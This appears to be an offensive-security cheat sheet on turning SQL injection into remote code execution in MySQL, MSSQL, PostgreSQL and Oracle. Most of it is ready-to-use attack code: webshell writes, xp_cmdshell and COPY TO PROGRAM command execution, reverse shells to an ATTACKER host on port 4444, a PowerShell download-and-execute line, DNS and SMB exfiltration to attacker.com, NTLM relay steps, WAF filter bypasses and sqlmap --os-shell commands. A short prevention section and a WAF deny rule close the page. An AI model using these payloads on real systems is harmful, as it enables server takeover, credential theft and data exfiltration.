---
tags:
  - critical
---

# SQLi → RCE

From database injection to code execution on the server.

## TL;DR

SQL Injection to RCE is the holy grail escalation. Database-specific features allow file writes (webshells), direct command execution, or credential theft leading to lateral movement.

| Database | Primary RCE Vector | Difficulty |
|----------|-------------------|------------|
| MySQL | INTO OUTFILE (webshell) | Medium |
| MSSQL | xp_cmdshell | Easy |
| PostgreSQL | COPY TO PROGRAM | Easy |
| Oracle | Java/Scheduler/UTL_FILE | Hard |

---

## Overview

```
SQLi → DB Identification → Privilege Check → RCE Vector
                                    ↓
                           MySQL: INTO OUTFILE → Webshell
                           MSSQL: xp_cmdshell → Direct exec
                           PostgreSQL: COPY PROGRAM → Direct exec
                           Oracle: Java/DBMS_SCHEDULER → Exec
```

---

## Chain 1: MySQL → Webshell via INTO OUTFILE

**Requirements:**
- FILE privilege (check: `SELECT file_priv FROM mysql.user WHERE user = current_user()`)
- `secure_file_priv` not set or writable path known
- Writable web directory path known

### Step 1: Check FILE Privilege

```sql
-- Check current user's file privilege
SELECT user, file_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1);

-- Check secure_file_priv setting
SELECT @@secure_file_priv;
-- NULL = can write anywhere
-- Empty = can write anywhere
-- /path/ = restricted to that path
```

### Step 2: Identify Web Root

```sql
-- Common paths to try
-- Linux: /var/www/html/, /var/www/, /usr/share/nginx/html/
-- Windows: C:/inetpub/wwwroot/, C:/xampp/htdocs/

-- Read existing files to confirm path
SELECT LOAD_FILE('/var/www/html/index.php');
SELECT LOAD_FILE('C:/inetpub/wwwroot/index.html');
```

### Step 3: Write Webshell

```sql
-- Basic PHP webshell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Bypass quotes with hex encoding
SELECT 0x3c3f706870207379737374656d28245f4745545b27636d64275d293b203f3e INTO OUTFILE '/var/www/html/shell.php';

-- Windows path (double backslash)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.php';

-- Using UNION injection
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -

-- Alternative shells
SELECT '<?php echo shell_exec($_REQUEST["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';
SELECT '<?php passthru($_GET["x"]); ?>' INTO OUTFILE '/var/www/html/x.php';
```

### Step 4: Execute Commands

```bash
# Access the webshell
curl "http://target.com/shell.php?cmd=id"
curl "http://target.com/shell.php?cmd=whoami"

# Reverse shell
curl "http://target.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

### MySQL INTO DUMPFILE (Binary Files)

```sql
-- DUMPFILE writes raw binary without formatting
SELECT unhex('4D5A...') INTO DUMPFILE '/var/www/html/shell.exe';

-- UDF DLL injection for direct command execution (advanced)
SELECT unhex('...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
SELECT sys_exec('id > /tmp/out');
```

### MySQL DNS Exfil (Windows Only)

```sql
-- Windows: UNC path for OOB data exfil
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'));
SELECT * INTO OUTFILE '\\\\attacker.com\\a';
```

---

## Chain 2: MSSQL → RCE via xp_cmdshell

**Requirements:**
- sysadmin privileges OR xp_cmdshell EXECUTE permission
- xp_cmdshell enabled (can enable if sysadmin)

### Step 1: Check Permissions

```sql
-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 1 = sysadmin, 0 = not

-- Check who can execute xp_cmdshell
USE master;
EXEC sp_helprotect 'xp_cmdshell';

-- Check xp_cmdshell status
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

### Step 2: Enable xp_cmdshell (If Disabled)

```sql
-- Requires sysadmin
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- One-liner for SQLi
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

### Step 3: Execute Commands

```sql
-- Basic command execution
EXEC xp_cmdshell 'whoami';
EXEC master..xp_cmdshell 'ipconfig';

-- In UNION injection context
' UNION SELECT 1,2,3,4; EXEC xp_cmdshell 'whoami'--

-- Using stacked queries
'; EXEC xp_cmdshell 'whoami';--

-- PowerShell reverse shell
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzACIALAA0ADQANAA0ACkA...';

-- Download and execute
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"';
```

### Step 4: Bypass xp_cmdshell Keyword Filter

```sql
-- Using dynamic SQL
DECLARE @cmd VARCHAR(100) = 'xp_cmdshell';
EXEC @cmd 'whoami';

-- Hex encoded execution
DECLARE @x AS VARCHAR(100) = 'xp_cmdshell';
EXEC @x 'ping attacker.com';
```

### MSSQL Alternative: sp_OACreate (File Write)

```sql
-- Enable Ole Automation
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Write file (webshell)
DECLARE @OLE INT;
DECLARE @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\inetpub\wwwroot\shell.aspx', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', Null, '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["c"]); %>';
EXEC sp_OADestroy @FileID;
EXEC sp_OADestroy @OLE;
```

### MSSQL: NTLM Hash Theft → Relay → RCE

```sql
-- Force SMB connection to steal NetNTLM hash
EXEC xp_dirtree '\\attacker_ip\share';
EXEC master.dbo.xp_dirtree '\\attacker_ip\share';
EXEC master..xp_subdirs '\\attacker_ip\share';
EXEC master..xp_fileexist '\\attacker_ip\share\file';

-- Capture with Responder
sudo responder -I eth0

-- Crack or relay the hash
hashcat -m 5600 hash.txt wordlist.txt
ntlmrelayx.py -t smb://target -smb2support
```

### MSSQL: SQL Agent Jobs

```sql
-- Create agent job (requires sysadmin)
USE msdb;
EXEC dbo.sp_add_job @job_name = N'pwned';
EXEC sp_add_jobstep @job_name = N'pwned', @step_name = N'exec',
    @subsystem = N'CmdExec', @command = N'whoami > C:\out.txt';
EXEC dbo.sp_add_jobserver @job_name = N'pwned';
EXEC dbo.sp_start_job N'pwned';
```

---

## Chain 3: PostgreSQL → RCE via COPY PROGRAM

**Requirements:**
- superuser OR pg_execute_server_program role member
- PostgreSQL 9.3+ (COPY ... TO PROGRAM introduced)

### Step 1: Check Permissions

```sql
-- Check if superuser
SELECT current_setting('is_superuser');
-- "on" = superuser

-- Check role membership
SELECT r.rolname, r.rolsuper,
  ARRAY(SELECT b.rolname FROM pg_auth_members m
        JOIN pg_roles b ON m.roleid = b.oid
        WHERE m.member = r.oid) as memberof
FROM pg_roles r WHERE r.rolname = current_user;

-- Look for pg_execute_server_program membership
```

### Step 2: Direct Command Execution

```sql
-- Basic COPY TO PROGRAM RCE
COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';
COPY (SELECT '') TO PROGRAM 'whoami';

-- Create table and exfiltrate output
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- In SQLi context (stacked queries required)
'; DROP TABLE IF EXISTS x; CREATE TABLE x(y text); COPY x FROM PROGRAM 'id';--
```

### Step 3: Reverse Shell

```sql
-- Perl reverse shell
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

-- Bash reverse shell (URL encode for SQLi)
COPY x FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';

-- Python reverse shell
COPY x FROM PROGRAM 'python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''';

-- Using curl for data exfil
COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER/?d=$(whoami | base64)';
```

### Step 4: Bypass WAF/Keyword Filters

```sql
-- Dynamic SQL execution in PL/pgSQL
DO $$
DECLARE cmd text;
BEGIN
  cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''whoami''';
  EXECUTE cmd;
END $$;

-- The CHR(67) = 'C', avoiding literal 'COPY' keyword
```

### PostgreSQL: File Write via COPY

```sql
-- Write webshell (requires pg_write_server_files or superuser)
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';

-- Base64 for special chars
COPY (SELECT convert_from(decode('PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==','base64'),'utf-8')) TO '/var/www/html/shell.php';
```

### PostgreSQL: Large Objects for Binary Upload

```sql
-- Import a file into large object
SELECT lo_import('/etc/passwd', 12345);

-- Export large object to file (write anywhere as postgres user)
SELECT lo_export(12345, '/tmp/passwd_copy');

-- Use for uploading binaries
SELECT lo_from_bytea(13337, decode('BASE64_PAYLOAD', 'base64'));
SELECT lo_export(13337, '/var/www/html/shell.php');
```

### PostgreSQL: Extension Loading RCE

```sql
-- If you can write files, upload malicious .so
-- Compile: gcc -shared -fPIC -o payload.so payload.c

-- Set library path and load
ALTER SYSTEM SET session_preload_libraries = 'payload';
SELECT pg_reload_conf();
-- RCE on next connection

-- Or use CREATE FUNCTION with C language
CREATE OR REPLACE FUNCTION exec(cmd text)
RETURNS text AS '/tmp/payload.so', 'exec' LANGUAGE C;
SELECT exec('id');
```

---

## Chain 4: Oracle → RCE (Multiple Vectors)

**Requirements:** DBA privileges or specific grants; Oracle is hardest to RCE

### Oracle: Java Stored Procedures

```sql
-- Requires CREATE PROCEDURE and JAVASYSPRIV
-- Create Java class for command execution
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "OSCommand" AS
import java.io.*;
public class OSCommand {
  public static String execCmd(String cmd) throws Exception {
    String[] cmdarray = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(cmdarray);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    StringBuffer sb = new StringBuffer();
    while ((line = br.readLine()) != null) { sb.append(line); }
    return sb.toString();
  }
};
/

-- Create PL/SQL wrapper
CREATE OR REPLACE FUNCTION os_command(cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'OSCommand.execCmd(java.lang.String) return java.lang.String';
/

-- Execute
SELECT os_command('id') FROM dual;
SELECT os_command('whoami') FROM dual;
```

### Oracle: DBMS_SCHEDULER

```sql
-- Requires CREATE JOB privilege
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'pwned',
    job_type => 'EXECUTABLE',
    job_action => '/bin/sh',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwned', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwned', 2, 'id > /tmp/pwned');
  DBMS_SCHEDULER.ENABLE('pwned');
END;
/
```

### Oracle: UTL_FILE (File Write)

```sql
-- Requires UTL_FILE privileges and accessible directory
CREATE OR REPLACE DIRECTORY EXPLOIT_DIR AS '/var/www/html';

DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('EXPLOIT_DIR', 'shell.php', 'W');
  UTL_FILE.PUT_LINE(f, '<?php system($_GET["c"]); ?>');
  UTL_FILE.FCLOSE(f);
END;
/
```

### Oracle: External Tables (File Read)

```sql
-- Read /etc/passwd via external table
CREATE TABLE ext_passwd (line VARCHAR2(4000))
ORGANIZATION EXTERNAL (
  TYPE ORACLE_LOADER
  DEFAULT DIRECTORY DATA_DIR
  ACCESS PARAMETERS (RECORDS DELIMITED BY NEWLINE)
  LOCATION ('/etc/passwd')
);
SELECT * FROM ext_passwd;
```

### Oracle: DNS Exfiltration via UTL_HTTP/UTL_INADDR

```sql
-- Using XXE in EXTRACTVALUE (unpatched Oracle)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT user FROM dual)||'.attacker.com/"> %remote;]>'),'/l') FROM dual;

-- Using UTL_INADDR
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual;
```

---

## Detection & Identification

### Database Fingerprinting

```sql
-- MySQL
SELECT @@version;
SELECT version();

-- MSSQL
SELECT @@version;

-- PostgreSQL
SELECT version();

-- Oracle
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE ROWNUM = 1;
```

### Quick RCE Capability Check

| Database | Check Command |
|----------|--------------|
| MySQL | `SELECT file_priv FROM mysql.user WHERE user = current_user()` |
| MSSQL | `SELECT IS_SRVROLEMEMBER('sysadmin')` |
| PostgreSQL | `SELECT current_setting('is_superuser')` |
| Oracle | `SELECT * FROM user_role_privs WHERE granted_role = 'DBA'` |

---

## Real-World Examples

### CVE-2019-9193: PostgreSQL "COPY FROM PROGRAM"

Not a CVE (PostgreSQL considers it a feature), but commonly exploited:

```sql
-- Authenticated users with sufficient privileges can execute OS commands
'; COPY cmd_output FROM PROGRAM 'id';--
```

### ImpressCMS SQLi to RCE (MySQL)

```sql
-- Prepared statements WAF bypass
0); SET @q = 0x53454c4543542027...'; PREPARE stmt FROM @q; EXECUTE stmt; #
-- Hex decodes to: SELECT '<?php...' INTO OUTFILE '/var/www/shell.php'
```

### MSSQL Linked Server Chain

```sql
-- Enumerate linked servers
EXEC sp_linkedservers;

-- Execute on linked server (double-hop for privilege escalation)
EXEC ('xp_cmdshell ''whoami''') AT LinkedServer;

-- If linked server has higher privileges, chain for RCE
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT SecondLinkedServer') AT FirstLinkedServer;
```

---

## SQLMap Automation

```bash
# MySQL webshell via INTO OUTFILE
sqlmap -u "http://target/page?id=1" --dbms=mysql --os-shell

# MSSQL xp_cmdshell
sqlmap -u "http://target/page?id=1" --dbms=mssql --os-shell

# PostgreSQL COPY TO PROGRAM
sqlmap -u "http://target/page?id=1" --dbms=postgresql --os-shell

# File read
sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

---

## Prevention

### Parameterized Queries (Primary Defense)

```python
# Python - Correct
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Python - VULNERABLE
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### Principle of Least Privilege

```sql
-- MySQL: Revoke FILE privilege
REVOKE FILE ON *.* FROM 'webapp'@'localhost';

-- MSSQL: Disable xp_cmdshell permanently
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- PostgreSQL: Don't grant superuser to app accounts
-- Use restricted role without pg_execute_server_program

-- Oracle: Revoke dangerous privileges
REVOKE EXECUTE ON UTL_FILE FROM webapp;
REVOKE EXECUTE ON DBMS_SCHEDULER FROM webapp;
```

### Database Hardening

```sql
-- MySQL: Set secure_file_priv
[mysqld]
secure_file_priv = /var/lib/mysql-files/

-- MSSQL: Disable Ole Automation
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;

-- PostgreSQL: Disable untrusted languages
DROP EXTENSION IF EXISTS plpythonu;
```

### WAF Rules

```
# Block common SQLi to RCE patterns
SecRule ARGS "@rx (?i)(into\s+(out|dump)file|xp_cmdshell|copy\s+.*\s+from\s+program)" "id:1001,deny,msg:'SQLi to RCE attempt'"
```

---

## Impact Table

| Vector | Database | Impact | CVSS |
|--------|----------|--------|------|
| INTO OUTFILE | MySQL | Webshell → Full RCE | 9.8 |
| xp_cmdshell | MSSQL | Direct command exec | 9.8 |
| COPY PROGRAM | PostgreSQL | Direct command exec | 9.8 |
| Java/Scheduler | Oracle | Command execution | 9.8 |
| NTLM Relay | MSSQL | Lateral movement | 8.8 |
| File Read | All | Credential theft | 7.5 |

---

## PoC Template

```markdown
## Summary
SQL Injection in [endpoint] escalates to RCE via [technique].

## Chain
1. SQLi allows arbitrary query execution
2. Database identified as [MySQL/MSSQL/PostgreSQL/Oracle]
3. User has [FILE/sysadmin/superuser] privileges
4. Using [INTO OUTFILE/xp_cmdshell/COPY PROGRAM], achieved RCE

## Steps
1. Inject payload: `[PAYLOAD]`
2. Verify execution: `[VERIFICATION]`
3. Achieve shell: `[RCE_PAYLOAD]`

## Impact
Full server compromise via SQLi → RCE chain.

CVSS: 9.8 (Critical)
```

---

## Quick Reference

| Database | File Write | Command Exec | Requirements |
|----------|-----------|--------------|--------------|
| MySQL | `INTO OUTFILE` | Via webshell/UDF | FILE priv, writable dir |
| MSSQL | `sp_OACreate` | `xp_cmdshell` | sysadmin |
| PostgreSQL | `COPY TO` | `COPY TO PROGRAM` | superuser/pg_* roles |
| Oracle | `UTL_FILE` | Java/DBMS_SCHEDULER | DBA/specific grants |

---
*Related: [SSRF to RCE](ssrf-to-rce.md) | [XSS to ATO](xss-to-ato.md)*
